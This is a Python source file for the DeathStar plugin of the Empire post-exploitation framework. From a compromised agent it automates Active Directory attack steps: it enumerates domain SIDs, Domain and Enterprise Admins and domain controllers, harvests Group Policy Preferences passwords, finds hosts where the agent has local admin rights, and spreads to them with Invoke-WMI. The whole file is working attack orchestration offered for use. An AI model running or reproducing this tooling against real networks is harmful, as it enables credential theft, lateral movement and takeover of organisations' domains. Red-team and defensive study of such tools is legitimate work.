from __future__ import print_function

import logging
from typing import override

from empire.server.api.v2.agent.agent_task_dto import ModulePostRequest
from empire.server.core.plugins import BasePlugin
from empire.server.core.db import models
from empire.server.core.db.models import PluginTaskStatus
from empire.server.core.hooks import hooks
from empire.server.core.plugin_service import PluginService
from .run_tasks import DeathStarTasks
from .utils import (
    posh_object_parser,
)

log = logging.getLogger(__name__)


class Plugin(BasePlugin):
    @override
    def on_load(self, db):
        self.execution_options = {
            "Agent": {"Description": "Name of Agent", "Required": True, "Value": ""},
        }

    @override
    def execute(self, command, **kwargs):
        try:
            agent_name = command["Agent"]
            user = kwargs["user"]
            db = kwargs["db"]

            deathstar_input = r"""
        _______   _______     ___   .___________. __    __          _______.___________.    ___      .______      
        |       \ |   ____|   /   \  |           ||  |  |  |        /       |           |   /   \     |   _  \     
        |  .--.  ||  |__     /  ^  \ `---|  |----`|  |__|  |       |   (----`---|  |----`  /  ^  \    |  |_)  |    
        |  |  |  ||   __|   /  /_\  \    |  |     |   __   |        \   \       |  |      /  /_\  \   |      /     
        |  '--'  ||  |____ /  _____  \   |  |     |  |  |  |    .----)   |      |  |     /  _____  \  |  |\  \----.
        |_______/ |_______/__/     \__\  |__|     |__|  |__|    |_______/       |__|    /__/     \__\ | _| `._____|
         Created by: byt3bl33d3r                    Return of the Plugin                                       V1.0
         Maintained by: Cx01N                                                                      
        """
            plugin_task = models.PluginTask(
                plugin_id=self.info.id,
                input=deathstar_input,
                input_full=deathstar_input,
                user_id=user.id,
                status=PluginTaskStatus.started,
            )
            plugin_task.output = f"[*] Starting Recon Scan: {agent_name}\n"
            db.add(plugin_task)
            db.flush()
            self.plugin_task_id = plugin_task.id

            agent = self.main_menu.agentsv2.get_by_id(db, agent_name)
            self.session_id = agent.session_id
            self.listener_name = agent.listener
            params = {"Agent": self.session_id, "OutputFunction": "Out-String"}
            module_post_request = ModulePostRequest(
                module_id="powershell_management_get_domain_sid", options=params
            )
            res, err = self.main_menu.agenttasksv2.create_task_module(
                db, agent, module_post_request, 0
            )

            if err:
                return f"[!] Error running module: {err}z"
            else:
                self.task_ids["domain_sid"] = res.id
            return "[*] Starting DeathStar..."

        except Exception as e:
            log.error(e)
            self.send_socketio_message(f"[!] {e}")
            return False

    @override
    def on_start(self, db):
        self.install_path = self.main_menu.installPath
        self.plugin_service: PluginService = self.main_menu.pluginsv2
        self.task_ids = {}
        self.domain_controllers = None
        self.deathstar_tasks = DeathStarTasks(self.main_menu)

        hooks.register_hook(
            hooks.BEFORE_TASKING_RESULT_HOOK, "get_domain_sid", self.get_domain_sid
        )
        hooks.register_hook(
            hooks.BEFORE_TASKING_RESULT_HOOK, "get_domain_admin", self.get_domain_admin
        )
        hooks.register_hook(
            hooks.BEFORE_TASKING_RESULT_HOOK,
            "get_enterprise_admin",
            self.get_enterprise_admin,
        )
        hooks.register_hook(
            hooks.BEFORE_TASKING_RESULT_HOOK,
            "get_domain_controller",
            self.get_domain_controller,
        )
        hooks.register_hook(hooks.BEFORE_TASKING_RESULT_HOOK, "get_gpp", self.get_gpp)
        hooks.register_hook(
            hooks.BEFORE_TASKING_RESULT_HOOK, "get_local_admin", self.get_local_admin
        )
        hooks.register_hook(
            hooks.BEFORE_TASKING_RESULT_HOOK, "get_wmi", self.get_invoke_wmi
        )
        hooks.register_hook(
            hooks.AFTER_AGENT_CHECKIN_HOOK,
            "on_new_agent_checkin",
            self.on_new_agent_checkin,
        )

    def get_task(self, db, task_id: int):
        plugin = self.plugin_service.get_by_id(db, "deathstar")
        if plugin:
            task = (
                db.query(models.PluginTask)
                .filter(models.PluginTask.id == task_id)
                .first()
            )
            if task:
                return task

        return None

    def on_new_agent_checkin(self, db, task):
        if "wmi" in self.task_ids:
            plugin_task = self.get_task(db, self.plugin_task_id)
            plugin_task.output += f"[+] Access gained to {task.hostname}\n"
            db.add(plugin_task)
            db.flush()

            self.task_ids = {}

    def get_invoke_wmi(self, db, task):
        if "wmi" in self.task_ids:
            if task.id in self.task_ids["wmi"]:
                if task.output:
                    plugin_task = self.get_task(db, self.plugin_task_id)
                    plugin_task.output += f"{task.output}\n"
                    db.add(plugin_task)
                    db.flush()

    def get_local_admin(self, db, task):
        if "local_admin" not in self.task_ids:
            return

        if task.id != self.task_ids["local_admin"]:
            return

        if not task.output:
            return

        if "Find-LocalAdminAccess completed" not in task.output:
            return

        self.localadmin_access = task.output.split("\r\n")[:-3]
        plugin_task = self.get_task(db, self.plugin_task_id)
        plugin_task.output += "[+] Local Admin Access found\n"
        self.task_ids["wmi"] = []
        for computer_name in self.localadmin_access:
            self.task_ids["wmi"].append(
                self.deathstar_tasks.run_invoke_wmi(
                    db, self.session_id, self.listener_name, computer_name
                )
            )
            plugin_task.output += f"[*] Attempting Invoke-WMI to {computer_name}\n"
            db.add(plugin_task)
            db.flush()

    def get_domain_sid(self, db, task):
        if "domain_sid" not in self.task_ids:
            return

        if not task.output:
            return

        if "Get-DomainSID completed" not in task.output:
            return

        group_sid = task.output.split()[0]
        plugin_task = self.get_task(db, self.plugin_task_id)

        if group_sid == "Get-DomainSID":
            plugin_task.output += "[!] No Group SID found\n"
            db.add(plugin_task)
            db.flush()
            return

        plugin_task.output += f"[+] Group SID: {group_sid}\n"
        self.task_ids["domain_admin"] = self.deathstar_tasks.run_get_group_member(
            db, group_sid + "-512", self.session_id
        )
        self.task_ids["enterprise_admin"] = self.deathstar_tasks.run_get_group_member(
            db, group_sid + "-519", self.session_id
        )
        self.task_ids["domain_controller"] = (
            self.deathstar_tasks.run_get_domain_controller(db, self.session_id)
        )

    def get_domain_controller(self, db, task):
        if "domain_controller" not in self.task_ids:
            return

        if task.id != self.task_ids["domain_controller"]:
            return

        if not task.output:
            return

        if "Get-DomainController completed" not in task.output:
            plugin_task = self.get_task(db, self.plugin_task_id)
            plugin_task.output += "[!] No Domain Controllers found\n"
            return

        plugin_task = self.get_task(db, self.plugin_task_id)
        self.domain_controllers = posh_object_parser(task.output)
        plugin_task.output += "[+] Domain Controllers found\n"
        db.add(plugin_task)
        db.flush()
        self.task_ids["gpp"] = self.deathstar_tasks.run_get_gpp(db, self.session_id)

    def get_domain_admin(self, db, task):
        if "domain_admin" not in self.task_ids:
            return

        if task.id != self.task_ids["domain_admin"]:
            return

        if not task.output:
            return

        if "Get-DomainGroupMember completed" not in task.output:
            plugin_task = self.get_task(db, self.plugin_task_id)
            plugin_task.output += "[!] No Domain Admins found\n"
            return

        self.domain_admins = posh_object_parser(task.output)
        plugin_task = self.get_task(db, self.plugin_task_id)
        plugin_task.output += "[+] Domain Admins found\n"
        db.add(plugin_task)
        db.flush()

    def get_enterprise_admin(self, db, task):
        if "enterprise_admin" not in self.task_ids:
            return

        if task.id != self.task_ids["enterprise_admin"]:
            return

        if not task.output:
            return

        if "Get-DomainGroupMember completed" not in task.output:
            plugin_task = self.get_task(db, self.plugin_task_id)
            plugin_task.output += "[!] No Enterprise Admins found\n"
            return

        self.enterprise_admins = posh_object_parser(task.output)
        plugin_task = self.get_task(db, self.plugin_task_id)
        plugin_task.output += "[+] Enterprise Admins found\n"
        db.add(plugin_task)
        db.flush()

    def get_gpp(self, db, task):
        if "gpp" not in self.task_ids:
            return

        if task.id != self.task_ids["gpp"]:
            return

        if not task.output:
            return

        if "Get-GPPPassword completed" not in task.output:
            plugin_task = self.get_task(db, self.plugin_task_id)
            plugin_task.output += "[!] No GPOs found\n"
            return

        parsed = posh_object_parser(task.output)
        gpo = {}
        for gpo in parsed:
            gpo["guid"] = gpo["file"].split("\\")[6][1:-1]
            gpo["passwords"] = gpo["passwords"][1:-1].split(", ")
            gpo["usernames"] = gpo["usernames"][1:-1].split(", ")

            # Gets rid of the "(built-in)" when administrator accounts are found
            gpo["usernames"] = [
                user.split()[0] if "(built-in)" in user.lower() else user
                for user in gpo["usernames"]
            ]

        plugin_task = self.get_task(db, self.plugin_task_id)

        if gpo:
            plugin_task.output += "[+] GPP Password found\n"
        else:
            plugin_task.output += "[!] No GPOs found\n"
        db.add(plugin_task)
        db.flush()
        self.task_ids["local_admin"] = self.deathstar_tasks.run_find_localadmin(
            db,
            self.session_id,
            self.domain_controllers[0]["name"],
            self.domain_controllers[0]["domain"],
        )

    @override
    def on_stop(self, db):
        """
        Kills additional processes that were spawned
        """
        pass
